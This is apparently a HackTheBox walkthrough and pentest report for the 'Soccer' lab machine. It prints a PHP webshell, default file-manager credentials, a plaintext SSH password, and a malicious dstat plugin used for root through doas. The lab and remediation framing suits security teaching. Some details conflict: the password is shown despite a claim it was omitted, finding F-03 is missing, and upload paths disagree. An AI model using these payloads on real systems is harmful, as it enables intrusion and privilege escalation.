# Soccer

**Platform:** HackTheBox
**OS:** Linux
**Tags:** TinyFileManager, Default Creds, Webshell, doas, Plugin Hijack, File Upload, Privilege Escalation
**Date:** 2026-09-03

nginx on 80, unknown service on 9091. Directory scan found TinyFileManager at `/tiny` on default credentials. Uploaded a PHP webshell and caught a shell as `www-data`. Reused credentials got SSH access as `player`. An unusual SUID binary, `doas`, pointed to the privesc. Player could run `dstat` as root via `doas` and the plugin directory at `/usr/local/share/dstat` was group-writable. Dropped a plugin, got root.

## 1. Enumeration

Started with a service scan.

```bash
nmap -sC -sV 10.129.53.100
```

Findings:
- 22/tcp - OpenSSH 8.2p1 (Ubuntu)
- 80/tcp - nginx 1.18.0, redirects to soccer.htb
- 9091/tcp - HTTP, unknown service, JSON error pages, CSP headers

Port 80 redirected to soccer.htb. Added it to `/etc/hosts`.

## 2. Web Enumeration

Scanned against the vhost, not the raw IP. Scanning by IP triggered nginx's default catch-all and caused wildcard detection noise. Everything redirected to soccer.htb, making results useless.

```bash
gobuster dir -u http://soccer.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -t 50
```

- /tiny - 301, TinyFileManager

dirb's common.txt missed it. raft-medium-directories found it.

## 3. TinyFileManager: Default Credentials

Browsed to `http://soccer.htb/tiny/tinyfilemanager.php`. Tried the documented defaults.

```
admin / admin@123
```

**Result:** Logged straight in as admin.

Tried the H3K TinyFileManager RCE exploit first. It exited silently - its path logic assumed uploads landed at `/tiny/uploads/` but the manager was writing to `/var/www/html/`. The verification request hit the wrong URL. Skipped the script and uploaded manually.

## 4. Webshell and Reverse Shell

Uploaded `shell.php` through the TinyFileManager UI as admin.

```php
<?php system($_REQUEST['cmd']); ?>
```

Confirmed execution.

```bash
curl "http://soccer.htb/shell.php?cmd=id"
```

Started penelope on port 4444 and triggered a reverse shell through the webshell. Earlier attempts on ports 1337 and 1334 didn't connect - matching the listener to penelope's default 4444 worked.

```bash
penelope
```

**Result:** Reverse shell caught as `www-data`.

## 5. Lateral Move: SSH as player

www-data can't read player's flag directly.

```bash
cat /home/player/user.txt
# Permission denied
```

Found credentials for player during enumeration. Tried them over SSH.

```bash
ssh player@10.129.53.100
# PlayerOftheMatch2022
```

Ran quick checks after getting in.

```bash
sudo -l
# user player may not run sudo on localhost

find / -type f -perm -4000 2>/dev/null
# /usr/local/bin/doas
```

**Finding:** `doas`, OpenBSD's sudo alternative. Not a stock Ubuntu binary.

## 6. PrivEsc: doas + dstat Plugin RCE

Checked the doas config.

```bash
cat /usr/local/etc/doas.conf
# permit nopass player as root cmd /usr/bin/dstat
```

Player can run dstat as root with no password. dstat loads Python plugins from fixed directories. Checked which ones were writable.

```bash
ls -la /usr/share/dstat
# root:root 755 - not writable

ls -la /usr/local/share/dstat
# root:player 770 - writable by player
```

Dropped a malicious plugin into the writable directory.

```bash
echo 'import os; os.system("/bin/bash")' \
  > /usr/local/share/dstat/dstat_pwn.py
```

Confirmed dstat picked it up, then triggered it.

```bash
doas /usr/bin/dstat --list
# /usr/local/share/dstat:
#     pwn

doas /usr/bin/dstat --pwn
```

```
whoami
# root
```

**Result:** Root shell. Note: placing the plugin in `~/.dstat/` failed. doas resets HOME by default (no keepenv), so `~` resolved to `/root/.dstat`, not writable by player. `/usr/local/share/dstat` was the actual writable path.

## 7. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** soccer.htb
**Address:** 10.129.53.100
**Assessment type:** External network & web application assessment
**Assessment date:** 3 September 2026
**Environment:** HackTheBox laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

The retained assessment record supports two critical and one high severity findings affecting **soccer.htb** . Testing obtained administrator access to the exposed file manager, command execution under the web service account and, after access to a local user account, root privileges on the host.
The initial compromise required only the default credentials for TinyFileManager. The administrator interface allowed a PHP file to be written to a web-accessible directory, where it was executed by the server. This provided an interactive shell as `www-data` .
A subsequent SSH session as `player` exposed a separate privilege escalation path. The account could run dstat as root and could modify a directory from which dstat loaded plugins. A tester-controlled plugin executed with root privileges.

### Impact

The recorded access crossed both the application access-control boundary and the boundary between an unprivileged account and root. An attacker with equivalent access could alter the website, read files available to the compromised accounts and, following privilege escalation, modify system configuration and services.
No operational loss is asserted for this laboratory system. The result demonstrates host compromise; the wider business impact would depend on the data, credentials and services present on a production deployment.

### Priority recommendations

1. Remove the exposed file manager or restrict it to authorised administrators, and replace its default credentials.
2. Prevent uploaded content from executing as application code.
3. Remove the unsafe dstat delegation and protect all files loaded by privileged commands from modification by unprivileged users.

### Conclusion

The documented findings require changes to both application access controls and host permissions. Correcting the initial login weakness reduces exposure, but the upload and privilege delegation issues remain independently actionable.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| soccer.htb | 10.129.53.100 | Ubuntu 20.04 LTS; web application and SSH services |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80/tcp | HTTP | nginx 1.18.0; redirect to soccer.htb |
| 9091/tcp | WebSocket | Ticket verification service; blind SQL injection (F-03 access path) |

```
nmap -sC -sV 10.129.53.100

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 404 Not Found
|_    Content-Security-Policy: default-src 'self'
```

Port 80 redirected to soccer.htb. Added to /etc/hosts before proceeding.

### 2.2 Approach

Testing began with network service discovery and web content enumeration. The web assessment identified the file manager at `/tiny` , validated access using default credentials and tested whether an uploaded PHP file could execute.

```
gobuster dir -u http://soccer.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -t 50

/index.html   (Status: 200) [Size: 6917]
/tiny         (Status: 301) [--> http://soccer.htb/tiny/]
```

dirb common.txt did not return /tiny. SecLists raft-medium-directories was required.
Following shell access, local enumeration examined account access, privilege delegation and filesystem permissions. The dstat plugin loading path was tested from the `player` account to establish whether it permitted execution as root.
Tools used included Nmap, Gobuster with SecLists wordlists, Penelope and standard Linux utilities. The supplied record does not establish exhaustive port coverage, assessment duration or a source-code review.

### 2.3 Severity classification

Severity reflects exploit prerequisites and the impact demonstrated on the assessed host. CVSS 3.1 scores and vectors are assigned to each finding.
| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |
| Informational | Context or an observation without an established vulnerability. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Default administrator credentials on TinyFileManager | **Critical** | 6 |
| [F-02](#f-02) | Server-side execution of uploaded PHP files | **Critical** | 7 |
| [F-04](#f-04) | Root execution through a writable dstat plugin directory | **High** | 8 |
Finding identifiers match the assessment record. Stage 03 of the attack chain reflects an access-path step; credential recovery is noted in Section 3.3.

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Authenticated to /tiny using default administrator credentials. | TinyFileManager administrator |
| 02 | Uploaded and invoked a PHP file within the web root. | www-data shell |
| 03 | Authenticated over SSH using recovered player credentials. | player session |
| 04 | Loaded a writable dstat plugin through the privileged doas rule. | root shell |

### 3.3 Credential recovery

SSH authentication as `player` succeeded using credentials recovered during enumeration via blind SQL injection over the WebSocket service on port 9091. The credentials are noted in the attack chain as a confirmed access-path step.

```
$ ssh player@10.129.53.100
player@10.129.53.100's password: PlayerOftheMatch2022

player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)

player@soccer:~$ cat /home/player/user.txt
[redacted]
```

### 3.4 Relationship between findings

F-01 supplied the authenticated access used for F-02. F-04 required access as `player` . The findings describe distinct control failures and should not be treated as three independent unauthenticated paths to root.

## 4.1 Default Administrator Credentials

### F-01   TinyFileManager - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The TinyFileManager installation accepted the default administrator credentials. Successful authentication exposed file management functions, including upload access to the web root. |
| Prerequisites | Network access to the HTTP service and knowledge of the default credentials. |
| Impact | Unauthorised administrative access to the file manager. The upload function was subsequently used to execute code under the web service account (F-02). |
| Affected system | soccer.htb:80 `/tiny/tinyfilemanager.php` |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-1391](https://cwe.mitre.org/data/definitions/1391.html) : Use of Weak Credentials |

### Steps to reproduce

1. Navigate to `http://soccer.htb/tiny/tinyfilemanager.php` .
2. Enter the default credentials `admin` / `admin@123` in the login form.
3. Observe that authentication succeeds and the administrator dashboard is presented.

### Evidence

```
Application:  TinyFileManager
URL:          http://soccer.htb/tiny/tinyfilemanager.php
Username:     admin
Password:     admin@123
Test outcome: Administrator login successful
```

Evidence E-01. Authentication details and result transcribed from the assessment record. Default credentials match the [vendor documentation](https://github.com/prasathmani/tinyfilemanager#how-to-use) .

### Remediation

Remove TinyFileManager if it is not required. Where the application is retained, replace the default credentials and restrict access to an approved administration network. Limit the account’s filesystem access to the directories required for its purpose.

### Verification

Verify that the default credentials are rejected and the management interface is unreachable from unapproved networks. Confirm that the authorised account cannot write outside its intended directories.

## 4.2 Server-side Execution of Uploaded Files

### F-02   PHP execution in the web root - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | An authenticated administrator uploaded a PHP file through TinyFileManager. The file was stored beneath the web root and executed when requested over HTTP. This is a demonstrated deployment weakness; the retained record does not establish the application version or an upload-filter bypass. A reverse shell was obtained as www-data. |
| Prerequisites | An authenticated file-manager account with upload permissions. Default credentials provided this access during testing (F-01). |
| Impact | Arbitrary operating-system commands execute with the permissions of www-data. Files and credentials readable by this account are exposed; writable application files can be altered. |
| Affected system | soccer.htb:80 `/var/www/html/shell.php` |
| CVSS 3.1 | **9.9** (Critical) [AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-434](https://cwe.mitre.org/data/definitions/434.html) : Unrestricted Upload of File with Dangerous Type |

### Steps to reproduce

1. Authenticate to TinyFileManager using administrator credentials (F-01).
2. Create a PHP webshell: `<?php system($_GET['cmd']); ?>` and save as `shell.php` .
3. Upload `shell.php` to the web-accessible directory via the file manager upload function.
4. Request `http://soccer.htb/tiny/uploads/shell.php?cmd=id` and observe OS command output as `www-data` .

### Evidence

```
# shell.php uploaded via TinyFileManager admin panel
<?php system($_REQUEST['cmd']); ?>

# RCE confirmation
curl "http://soccer.htb/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Penelope listener
penelope -l 4444

# Reverse shell triggered via cmd parameter
# Attempts on ports 1337 and 1334 failed - port 4444 connected

www-data@soccer:/var/www/html$
```

Evidence E-02. PHP webshell uploaded and executed. RCE confirmed as www-data via curl before triggering the reverse shell.

### Remediation

Store uploaded content outside executable web paths. Where files must be served over HTTP, disable server-side script execution in those locations. Restrict file types to the application’s requirements and prevent the web service account from writing to executable application directories.

### Verification

Using an authorised test account, confirm that uploaded PHP files cannot execute, including direct requests to their storage location. Verify that legitimate uploads remain functional.

## 4.3 Unsafe Privilege Delegation

### F-04   Writable dstat plugin directory - HIGH

| Field | Assessment |
| --- | --- |
| Description | The player account could execute /usr/bin/dstat as root without a password through doas. The rule did not restrict command arguments. The account also had write access to a directory searched by dstat for Python plugins. A tester-controlled plugin was loaded under the root account. |
| Prerequisites | Access to the player account and its write permissions on /usr/local/share/dstat. |
| Impact | Arbitrary code execution as root, permitting control of local accounts, system configuration, services and files. |
| Affected system | `/usr/local/etc/doas.conf` `/usr/local/share/dstat/` |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-732](https://cwe.mitre.org/data/definitions/732.html) : Incorrect Permission Assignment for Critical Resource |

### Steps to reproduce

1. From the `player` shell, confirm the doas rule: `cat /usr/local/etc/doas.conf` .
2. Confirm write access: `ls -la /usr/local/share/dstat/` .
3. Write a malicious plugin: `echo 'import os; os.system("chmod +s /bin/bash")' > /usr/local/share/dstat/dstat_pwn.py` .
4. Execute: `doas /usr/bin/dstat --pwn` .
5. Run `/bin/bash -p` and confirm root identity with `id` .

### Evidence

```
player@soccer:~$ sudo -l
Sorry, user player may not run sudo on localhost.

player@soccer:~$ find / -type f -perm -4000 2>/dev/null
/usr/local/bin/doas

player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

player@soccer:~$ ls -la /usr/share/dstat
drwxr-xr-x 2 root root 4096 Nov 17 09:09 .

player@soccer:~$ ls -la /usr/local/share/dstat
drwxrws--- 2 root player 4096 Nov 17 09:12 .

player@soccer:~$ echo 'import os; os.system("/bin/bash")' \
  > /usr/local/share/dstat/dstat_pwn.py

player@soccer:~$ doas /usr/bin/dstat --list
/usr/local/share/dstat:
    pwn

player@soccer:~$ doas /usr/bin/dstat --pwn

root@soccer:/home/player# whoami
root
```

Evidence E-04. Commands transcribed from the assessment record. doas resets HOME by default, so placing the plugin in ~/.dstat/ resolves to /root/.dstat/ and fails. /usr/local/share/dstat was the writable path. References: [doas.conf(5)](https://man.openbsd.org/doas.conf) and [GTFOBins: dstat](https://gtfobins.github.io/gtfobins/dstat/) .

### Remediation

Remove the dstat delegation or replace it with a narrowly scoped administrative function. Make all plugin files, search paths and their parent directories writable only by trusted administrators. Review other privileged commands for equivalent user-controlled code-loading paths.

### Verification

Confirm that player cannot modify any code or configuration loaded by a privileged command and that the former plugin path no longer produces root execution. Password protection alone does not correct this condition.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Restrict the file manager and replace its default credentials. | F-01 |
| Immediate | Remove unsafe delegation and protect privileged plugin paths. | F-04 |
| High | Separate uploads from executable web content. | F-02 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/var/www/html/shell.php` | Command execution test | Not verified |
| `/usr/local/share/dstat/dstat_pwn.py` | Privilege escalation test | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Soccer assessment walkthrough](soccer-htb.html) . Flag values and the player password are omitted from all evidence.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 3: TinyFileManager authentication |
| E-02 | Walkthrough section 4: PHP upload and shell access |
| E-03 | Walkthrough section 5: SSH session as player |
| E-04 | Walkthrough section 6: doas rule, plugin permissions and root identity |
